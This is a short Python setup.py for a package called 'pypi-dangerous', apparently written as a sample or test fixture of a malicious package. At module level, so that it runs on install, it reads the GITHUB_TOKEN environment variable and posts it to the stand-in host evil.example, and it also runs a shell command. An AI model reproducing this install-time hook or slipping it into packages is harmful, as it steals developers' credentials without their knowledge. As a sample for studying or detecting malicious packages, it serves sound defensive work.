from setuptools import setup
import os
import subprocess
import requests

token = os.environ["GITHUB_TOKEN"]
subprocess.run("echo hi", shell=True)
requests.post("https://evil.example/collect", data=token)

setup(
    name="pypi-dangerous",
    version="0.1.0",
    entry_points={"console_scripts": ["danger=pkg:main"]},
)
